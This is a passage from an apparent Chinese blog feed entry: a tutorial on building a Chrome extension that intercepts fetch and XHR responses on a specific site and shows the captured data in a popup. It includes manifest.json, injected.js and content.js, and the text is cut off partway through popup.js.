插件需要添加&amp;#x27;storage&amp;#x27;权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;// document.cookie&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;// localStorage[&amp;#x27;key&amp;#x27;]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;// console.log(&amp;#x27;xhr监听完成&amp;#x27;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;variable language_&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;title function_&quot;&gt;postMessage&lt;/span&gt;(&amp;#123; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&amp;#x27;xhr&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;attr&quot;&gt;data&lt;/span&gt;: &lt;span class=&quot;variable language_&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;response&lt;/span&gt; &amp;#125;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;*&amp;#x27;&lt;/span&gt;);  &lt;span class=&quot;comment&quot;&gt;// 将响应发送到 content script&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; send.&lt;span class=&quot;title function_&quot;&gt;apply&lt;/span&gt;(&lt;span class=&quot;variable language_&quot;&gt;this&lt;/span&gt;, &lt;span class=&quot;variable language_&quot;&gt;arguments&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)(&lt;span class=&quot;title class_&quot;&gt;XMLHttpRequest&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&quot;content-js&quot;&gt;&lt;a href=&quot;#content-js&quot; class=&quot;headerlink&quot; title=&quot;content.js&quot;&gt;&lt;/a&gt;content.js&lt;/h1&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable language_&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;title function_&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;编号查询插件注入成功&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// inject injected script&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; s = &lt;span class=&quot;variable language_&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;title function_&quot;&gt;createElement&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;script&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;s.&lt;span class=&quot;property&quot;&gt;src&lt;/span&gt; = chrome.&lt;span class=&quot;property&quot;&gt;runtime&lt;/span&gt;.&lt;span class=&quot;title function_&quot;&gt;getURL&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;injected.js&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;s.&lt;span class=&quot;property&quot;&gt;onload&lt;/span&gt; = &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;variable language_&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;title function_&quot;&gt;remove&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;variable language_&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;head&lt;/span&gt; || &lt;span class=&quot;variable language_&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;documentElement&lt;/span&gt;).&lt;span class=&quot;title function_&quot;&gt;appendChild&lt;/span&gt;(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// receive message from injected script&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable language_&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;title function_&quot;&gt;addEventListener&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;message&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;e&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 判断类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; type = e.&lt;span class=&quot;property&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;type&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (type === &lt;span class=&quot;string&quot;&gt;&amp;#x27;ocr&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    chrome.&lt;span class=&quot;property&quot;&gt;storage&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;local&lt;/span&gt;.&lt;span class=&quot;title function_&quot;&gt;get&lt;/span&gt;([&lt;span class=&quot;string&quot;&gt;&amp;quot;result&amp;quot;&lt;/span&gt;], &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;result&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;variable language_&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;title function_&quot;&gt;log&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; data = result.&lt;span class=&quot;property&quot;&gt;result&lt;/span&gt; ?? &lt;span class=&quot;string&quot;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; tmp = data + e.&lt;span class=&quot;property&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;data&lt;/span&gt; + &lt;span class=&quot;string&quot;&gt;&amp;#x27;&#92;n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      chrome.&lt;span class=&quot;property&quot;&gt;storage&lt;/span&gt;.&lt;span class=&quot;property&quot;&gt;local&lt;/span&gt;.&lt;span class=&quot;title function_&quot;&gt;set&lt;/span&gt;(&amp;#123; &lt;span class=&quot;attr&quot;&gt;result&lt;/span&gt;: tmp &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>需要监听某个网络请求</p><p>并根据body信息做出判断</p><p>将结果展示到插件页面</p><h1 id="manifest-json"><a href="#manifest-json" class="headerlink" title="manifest.json"></a>manifest.json</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;manifest_version&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;permissions&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;contextMenus&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;cookies&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;storage&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;history&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;webRequest&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;webRequestBlocking&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;*://*/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;http://www.baidu.com/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;tabs&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;content_scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;matches&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;http://www.baidu.com/*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;js&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;content.js&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;run_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;document_start&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;all_frames&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;browser_action&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;default_title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;default_popup&quot;</span><span class="punctuation">:</span> <span class="string">&quot;popup.html&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;icons&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;16&quot;</span><span class="punctuation">:</span> <span class="string">&quot;icons/icon.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;32&quot;</span><span class="punctuation">:</span> <span class="string">&quot;icons/icon.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;48&quot;</span><span class="punctuation">:</span> <span class="string">&quot;icons/icon.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;128&quot;</span><span class="punctuation">:</span> <span class="string">&quot;icons/icon.png&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;web_accessible_resources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;injected.js&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="injected-js"><a href="#injected-js" class="headerlink" title="injected.js"></a>injected.js</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> origFetch = <span class="variable language_">window</span>.<span class="property">fetch</span>;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">fetch</span> = <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params">...args</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">origFetch</span>(...args);</span><br><span class="line">        <span class="comment">// console.log(&#x27;fetch request:&#x27;, args);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> [url] = args</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> response</span><br><span class="line">            .<span class="title function_">clone</span>()</span><br><span class="line">            .<span class="title function_">json</span>() <span class="comment">// 此处需要根据不同数据调用不同方法</span></span><br><span class="line">            .<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(err));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对于二进制大文件可以创建为URL(blob:开头)，供其它脚本访问</span></span><br><span class="line">        <span class="comment">//sessionStorage[&#x27;wave&#x27;] = URL.createObjectURL(data); // 插件需要添加&#x27;storage&#x27;权限</span></span><br><span class="line">        <span class="comment">// // 只监听某些地址</span></span><br><span class="line">        <span class="keyword">if</span> (url === <span class="string">&#x27;./xx/xx/xx&#x27;</span> &amp;&amp; data.<span class="property">respData</span>.<span class="property">corpOther</span>.<span class="title function_">includes</span>(<span class="string">&#x27;xxxx&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable language_">window</span>.<span class="title function_">postMessage</span>(&#123; <span class="attr">type</span>: <span class="string">&#x27;type&#x27;</span>, <span class="attr">data</span>: data.<span class="property">respData</span> &#125;, <span class="string">&#x27;*&#x27;</span>); <span class="comment">// send to content script</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">// 下面为xhr，需要则打开</span></span><br><span class="line">(<span class="keyword">function</span> (<span class="params">xhr</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">XHR</span> = <span class="title class_">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> open = <span class="variable constant_">XHR</span>.<span class="property">open</span>;</span><br><span class="line">    <span class="keyword">var</span> send = <span class="variable constant_">XHR</span>.<span class="property">send</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable constant_">XHR</span>.<span class="property">open</span> = <span class="keyword">function</span> (<span class="params">method, url</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_method</span> = method;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_url</span> = url;</span><br><span class="line">        <span class="keyword">return</span> open.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="variable constant_">XHR</span>.<span class="property">send</span> = <span class="keyword">function</span> (<span class="params">postData</span>) &#123;</span><br><span class="line">        <span class="comment">// console.log(&#x27;xhr request:&#x27;, this._method, this._url, postData);</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="comment">// sessionStorage[&#x27;key&#x27;] = JSON.stringify(response); // 插件需要添加&#x27;storage&#x27;权限</span></span><br><span class="line">            <span class="comment">// document.cookie</span></span><br><span class="line">            <span class="comment">// localStorage[&#x27;key&#x27;]</span></span><br><span class="line">            <span class="comment">// console.log(&#x27;xhr监听完成&#x27;);</span></span><br><span class="line">            <span class="variable language_">window</span>.<span class="title function_">postMessage</span>(&#123; <span class="attr">type</span>: <span class="string">&#x27;xhr&#x27;</span>, <span class="attr">data</span>: <span class="variable language_">this</span>.<span class="property">response</span> &#125;, <span class="string">&#x27;*&#x27;</span>);  <span class="comment">// 将响应发送到 content script</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> send.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)(<span class="title class_">XMLHttpRequest</span>);</span><br></pre></td></tr></table></figure><h1 id="content-js"><a href="#content-js" class="headerlink" title="content.js"></a>content.js</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;编号查询插件注入成功&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// inject injected script</span></span><br><span class="line"><span class="keyword">let</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">s.<span class="property">src</span> = chrome.<span class="property">runtime</span>.<span class="title function_">getURL</span>(<span class="string">&#x27;injected.js&#x27;</span>);</span><br><span class="line">s.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">remove</span>();</span><br><span class="line">&#125;;</span><br><span class="line">(<span class="variable language_">document</span>.<span class="property">head</span> || <span class="variable language_">document</span>.<span class="property">documentElement</span>).<span class="title function_">appendChild</span>(s);</span><br><span class="line"></span><br><span class="line"><span class="comment">// receive message from injected script</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="comment">// 判断类型</span></span><br><span class="line">  <span class="keyword">const</span> type = e.<span class="property">data</span>.<span class="property">type</span></span><br><span class="line">  <span class="keyword">if</span> (type === <span class="string">&#x27;ocr&#x27;</span>) &#123;</span><br><span class="line">    chrome.<span class="property">storage</span>.<span class="property">local</span>.<span class="title function_">get</span>([<span class="string">&quot;result&quot;</span>], <span class="keyword">function</span> (<span class="params">result</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">123</span>);</span><br><span class="line">      <span class="keyword">const</span> data = result.<span class="property">result</span> ?? <span class="string">&#x27;&#x27;</span></span><br><span class="line">      <span class="keyword">const</span> tmp = data + e.<span class="property">data</span>.<span class="property">data</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">      chrome.<span class="property">storage</span>.<span class="property">local</span>.<span class="title function_">set</span>(&#123; <span class="attr">result</span>: tmp &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="popup-html"><a href="#popup-html" class="headerlink" title="popup.html"></a>popup.html</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>xxxx<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.main</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">500px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.main</span> <span class="selector-class">.textarea</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>以下为请求结果<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;clearButton&quot;</span>&gt;</span>清空结果<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;getResultButton&quot;</span>&gt;</span>获取结果<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;result&quot;</span> <span class="attr">class</span>=<span class="string">&quot;textarea&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./popup.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="popup-js"><a href="#popup-js" class="headerlink" title="popup.js"></a>popup.js</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">clear</span>(<span class="params"></span>) &#123;</span><br><span class="line">    chrome.<span class="property">storage</span>.<span class="property">local</span>.<span class="title function_">set</span>(&#123; <span class="string">&quot;result&quot;</span>: <span class="string">&quot;&quot;</span> 